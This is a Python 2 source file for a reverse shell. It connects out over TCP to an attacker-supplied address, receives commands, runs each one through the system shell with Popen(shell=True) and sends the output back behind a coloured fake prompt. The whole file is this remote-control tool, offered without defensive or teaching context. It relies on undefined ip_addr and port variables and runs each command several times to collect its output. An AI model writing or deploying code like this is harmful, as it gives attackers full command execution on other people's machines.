import socket, sys, os, time, webbrowser
import signal
from subprocess import PIPE, Popen, call

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_addr,port))
    os.chdir('/')
    shellinput(s)

def shellinput(s):    
    while True:
        command = s.recv(1024)
    
        if 'exit' in command:
            s.close()
            logout()

        else:
            uname = Popen('uname', shell =True, stdout = PIPE).stdout.read().split('\n')[0]
            present = Popen('pwd', shell =True, stdout = PIPE).stdout.read().split('\n')[0]
            s.send('\033[92m            '+uname+'\033[0;0m@\033[94m\033[1m '+present+'\033[0;0m:$ \n')

            con(s, command)

def logout():
    sys.exit()

def con(s, command):

    try:    
        re = command.split(' ')

        if re[0] == 'cd':
            if len(re)>1 and re[1].startswith('/'):
                os.chdir(re[1].split('\n')[0])
                s.send(re[0].split('\n')[0]+re[1].split('\n')[0])
                shellinput(s)
            
            elif len(re)>1 and not re[1].startswith('/'):
                present = Popen('pwd', shell =True, stdout = PIPE).stdout.read().split('\n')[0]
                os.chdir(str(present)+'/'+re[1].split('\n')[0])
                s.send(re[0].split('\n')[0]+'/'+re[1].split('\n')[0])
                shellinput(s)

            else:
                os.chdir('/')
                s.send(re[0].split('\n')[0]+str('/'))
                shellinput(s)

        length = len((Popen(command, shell = True, stdout = PIPE).stdout.read()).split('\n'))
        s.send('            ')
        for i in range(0,length):
            if len(((Popen(command, shell = True, stdout = PIPE, stderr = PIPE).stdout.read()).split('\n')[i]))>10:
                s.send(str(((Popen(command, shell = True, stdout = PIPE).stdout.read()).split('\n')[i])))
                s.send("\n            ")
            
            else:
                if i == 12:
                    s.send('\n            ')
                s.send(str(((Popen(command, shell = True, stdout = PIPE).stdout.read()).split('\n')[i])+" "))
    
    except Exception as e:
        s.send("\033[91m             Enter Again!\033[0;0m")
        shellinput(s)
    
    shellinput(s)

